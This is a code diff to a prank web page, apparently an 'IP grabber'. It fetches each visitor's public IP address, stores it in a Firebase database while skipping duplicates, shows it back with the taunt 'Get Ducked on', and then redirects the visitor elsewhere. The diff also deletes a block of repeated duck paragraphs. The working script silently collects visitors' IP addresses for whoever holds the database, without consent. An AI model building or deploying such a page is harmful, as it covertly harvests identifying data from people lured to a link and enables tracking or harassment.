@@ -7,7 +7,7 @@
     <script type="module">
         // Import the functions you need from the SDKs you need
         import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
-        import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
+        import { getDatabase, ref, push, set, get, child } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
 
         // Your Firebase configuration
         const firebaseConfig = {
@@ -27,15 +27,33 @@
             .then(response => response.json())
             .then(data => {
                 const userIP = data.ip;
-                console.log("Get Ducked on 🦆",userIP);
+                console.log("Get Ducked on 🦆", userIP);
+ 
+                document.getElementById("ipMessage").textContent = `Get Ducked on: ${userIP} 🦆`;
 
-                const ipRef = push(ref(database, 'ips'));
-                return set(ipRef, {
-                    ip: userIP 
+                const ipRef = ref(database, 'ips');
+
+                return get(ipRef).then(snapshot => {
+                    let ipExists = false;
+                    if (snapshot.exists()) {
+                        snapshot.forEach(childSnapshot => {
+                            if (childSnapshot.val().ip === userIP) {
+                                ipExists = true;
+                            }
+                        });
+                    }
+
+                    if (!ipExists) {
+                        const newIPRef = push(ipRef);
+                        return set(newIPRef, {
+                            ip: userIP 
+                        });
+                    } else {
+                        console.log("IP address already logged:", userIP);
+                    }
                 });
             })
             .then(() => {
-                // Redirect to a different site after storing the IP
                 window.location.href = "https://forthefunofit.pages.dev"; // Replace with your desired URL
             })
             .catch(error => console.error("Error fetching IP:", error));
@@ -43,113 +61,6 @@
 </head>
 <body>
     <h1>lol</h1>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
-    <p>🦆</p>
+    <p id="ipMessage">Get Ducked on: 🦆</p>
 </body>
 </html>
